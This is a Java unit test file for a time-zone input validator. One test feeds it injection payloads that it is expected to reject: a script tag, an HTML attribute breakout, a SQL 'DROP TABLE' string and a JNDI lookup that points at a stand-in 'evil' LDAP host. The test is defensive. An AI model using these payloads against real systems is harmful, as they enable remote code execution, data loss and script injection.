package org.bruneel.thankyouboard.validation;

import org.junit.jupiter.api.Test;

import java.time.ZoneId;

import static org.assertj.core.api.Assertions.assertThat;

class TimeZoneValidatorTest {

    @Test
    void parse_acceptsValidIanaZoneIds() {
        assertThat(TimeZoneValidator.parse("America/New_York")).isEqualTo(ZoneId.of("America/New_York"));
        assertThat(TimeZoneValidator.parse("Europe/Brussels")).isNotNull();
        assertThat(TimeZoneValidator.parse("UTC")).isEqualTo(ZoneId.of("UTC"));
        assertThat(TimeZoneValidator.parse("Z")).isEqualTo(ZoneId.of("Z"));
        assertThat(TimeZoneValidator.parse("+02:00")).isNotNull();
    }

    @Test
    void parse_returnsNullForNullOrBlank() {
        assertThat(TimeZoneValidator.parse(null)).isNull();
        assertThat(TimeZoneValidator.parse("")).isNull();
        assertThat(TimeZoneValidator.parse("   ")).isNull();
    }

    @Test
    void parse_rejectsInvalidFormat_preventsInjection() {
        // Script/HTML injection attempts
        assertThat(TimeZoneValidator.parse("<script>alert(1)</script>")).isNull();
        assertThat(TimeZoneValidator.parse("America/New_York\"><img src=x>")).isNull();
        assertThat(TimeZoneValidator.parse("'; DROP TABLE pdf_job;--")).isNull();
        assertThat(TimeZoneValidator.parse("${jndi:ldap://evil}")).isNull();
        // Newlines, quotes, backslash (middle newline not trimmed)
        assertThat(TimeZoneValidator.parse("America/New\nYork")).isNull();
        assertThat(TimeZoneValidator.parse("America\"New_York")).isNull();
        assertThat(TimeZoneValidator.parse("America\\New_York")).isNull();
        // Unknown zone ID (valid format but not a real zone)
        assertThat(TimeZoneValidator.parse("Not/A_Zone")).isNull();
    }

    @Test
    void parse_rejectsOverMaxLength() {
        String longZone = "A".repeat(65);
        assertThat(TimeZoneValidator.parse(longZone)).isNull();
        assertThat(TimeZoneValidator.parse("America/" + "x".repeat(60))).isNull();
    }

    @Test
    void sanitizeForStore_returnsTrimmedValueOnlyWhenValid() {
        assertThat(TimeZoneValidator.sanitizeForStore("  Europe/London  ")).isEqualTo("Europe/London");
        assertThat(TimeZoneValidator.sanitizeForStore("America/New_York")).isEqualTo("America/New_York");
        assertThat(TimeZoneValidator.sanitizeForStore("<script>")).isNull();
        assertThat(TimeZoneValidator.sanitizeForStore(null)).isNull();
        assertThat(TimeZoneValidator.sanitizeForStore("")).isNull();
    }

    @Test
    void isValidFormat_acceptsSafeCharactersOnly() {
        assertThat(TimeZoneValidator.isValidFormat("America/New_York")).isTrue();
        assertThat(TimeZoneValidator.isValidFormat("+02:00")).isTrue();
        assertThat(TimeZoneValidator.isValidFormat("UTC")).isTrue();
        assertThat(TimeZoneValidator.isValidFormat("A")).isTrue();
        assertThat(TimeZoneValidator.isValidFormat("a_b/c+d-e:f")).isTrue();
        assertThat(TimeZoneValidator.isValidFormat("x<>y")).isFalse();
        assertThat(TimeZoneValidator.isValidFormat("x\ny")).isFalse();
        assertThat(TimeZoneValidator.isValidFormat("x\"y")).isFalse();
    }
}
